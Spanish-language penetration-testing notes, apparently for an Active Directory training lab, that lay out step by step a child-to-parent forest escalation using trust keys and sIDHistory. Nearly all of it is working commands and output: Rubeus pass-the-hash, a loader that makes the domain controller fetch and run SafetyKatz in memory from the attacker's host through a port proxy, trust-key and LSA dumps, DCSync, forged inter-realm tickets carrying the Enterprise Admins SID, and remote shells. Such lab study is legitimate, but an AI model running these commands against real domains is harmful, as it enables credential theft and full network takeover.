# Across Atacks 

Tags: #AD 

- **Entre dominios (dentro del mismo bosque)** → existe una relación de confianza implícita de dos vías.
- **Entre bosques (forests)** → es necesario establecer explícitamente una relación de confianza.

Enterprise Admins:
- **sIDHistory** es un atributo de usuario diseñado para escenarios donde un usuario es movido de un dominio a otro. Cuando el dominio de un usuario cambia, se le asigna un nuevo **SID** y el SID anterior se agrega a **sIDHistory**.
- **sIDHistory** puede ser abusado de dos formas para escalar privilegios dentro de un bosque:
    - Uso del **hash de krbtgt** del dominio hijo
    - Uso de **trust tickets**

```bash 
519 - Es el RID del 'Enterprise Admins Group' 
```

## Child to parent using Trust Tickets


```powershell 
! Usuario: Usuario de dominio

Paso 1: 
# Hacer OPTH con el usuario admin del server ejecutando el siguiente comando en una consola cmd en la máquina de atacante como administrador local la cual abrira una nueva consola con ese ticket y es ahi donde se ejecutan los siguientes comandos
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

Paso 2:
# Dentro de la sesión con el ticket importado ejecutar lo siguiente:
❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y     # Copiar el Loader.exe al DC
```

```powershell 
! Usuario: Domain Admin (ejecutado en el DC hijo)

Paso 3:
❯ winrs -r:dcorp-dc cmd       # Ingresar al DC 
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

# PAso 3 IMPORTANTE 
❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
# Descarga SafetyKatz en memoria dentro del DC y ejecuta lsadump::trust para extraer las Trust Keys almacenadas en el controlador de dominio.


	# Obtendremos:
	(Abusar de la forma 1)
	Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
	Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
	 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
	    * 2/24/2023 1:11:33 AM - CLEAR   - 79 d9 90 1f 7c db 09 b7 65 a0 e5 e4 50 03 35 8b 99 fb eb bb e7 ba 54 89 b7 b2 f4 fc
	        * aes256_hmac       34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
	        * aes128_hmac       40856eb80d3323adf23a3b7faad3c180
	        * rc4_hmac_nt       132f54e05f7c3db02e97c00ff3879067  (SE USA EN EL SIGUIENTE COMANDO DEL PASO 4)

	(Abusar de la forma 2)
	Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
	 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
	    * 2/24/2023 1:10:52 AM - CLEAR   - 4b 28 69 61 81 ef 64 36 4e 80 d2 0a 54 63 08 fe 58 e8 18 14 cd 90 15 ac 93 10 02 37
	        * aes256_hmac       bc1e5642c1afebbeeb76b9ba6f688ea0c876ecac7ecdd4b7e95d5beb35d886df
	        * aes128_hmac       9896c96f784de9a0341150b7fa1e2360
	        * rc4_hmac_nt       163373571e6c3e09673010fd60accdf0  (SE USA EN EL SIGUIENTE COMANDO DEL PASO 4)


❯ SafetyKatz.exe "lsadump::trust /patch"
# Extraer la trust key [In] del dominio hijo al padre — necesaria para forjar inter-realm tickets y escalar al dominio padre.

❯ SafetyKatz.exe "lsadump::dcsync /user:DC_hijo\DC_Padre$"
❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
# Extraer la trust key vía DCSync usando la cuenta de confianza del dominio padre — alternativa sin parchear LSASS.

❯ SafetyKatz.exe "lsadump::lsa /patch"
# Extraer todas las credenciales del DC incluyendo la trust key — alternativa más amplia que muestra todos los hashes.
```

```powershell 
! Usuario: Domain Admin del dominio hijo

❯ .\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

Paso 4 (Abusar de la forma 1): 
# Forjar un inter-realm TGT usando la trust key del dominio hijo para escalar al dominio padre el cual regresará un 'HASH BASE64'
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
	# silver    → Nombre del módulo 
	# /service  → servicio objetivo: krbtgt del dominio padre (inter-realm TGT)
	# /rc4      → trust key (hash NTLM) de la relación de confianza hijo → padre  (IMPORTANTE)
	# /sid      → SID del dominio hijo. Es el (Current domain:)
	# /sids     → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519) — otorga privilegios en todo el bosque. Es el (Domain:)
	# 519       → El 519 al final del sid es importante para que funcione 
	# /ldap     → consulta al DC para obtener atributos del usuario automáticamente
	# /user     → usuario Administrator a impersonar en el ticket forjado
	# /nowrap   → muestra el ticket en base64 sin saltos de línea para facilitar su copia


Paso 4 (Abusar de la forma 2): 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:163373571e6c3e09673010fd60accdf0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap

❯ .\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>

Paso 5 (Abusar de la forma 1): 
# TICKET HTTP
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
# Usar el inter-realm TGT forjado para solicitar un TGS para un servicio del dominio padre e inyectarlo en la sesión actual — completa el escalado de dominio hijo a dominio padre.
# FORGED TICKET = Es el resultado del comando anterior al forjar el ticket 

# TICKET CIFS (SMB)
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...


Paso 5 (Abusar de la forma 2):
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...


Paso 6 (Abusar de la forma 1): 
❯ winrs -r:mcorp-dc.moneycorp.local cmd.exe
# Abrir una shell remota en el equipo objetivo usando el ticket inyectado ahora en el server del 'Dominio Padre mcorp-dc'
	❯ set username
	❯ set computername

Paso 6 (Abusar de la forma 2): 
❯ dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\                # Listar el contenido del directorio  
❯ type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt     # Mostrar el contenido de un archivo 
```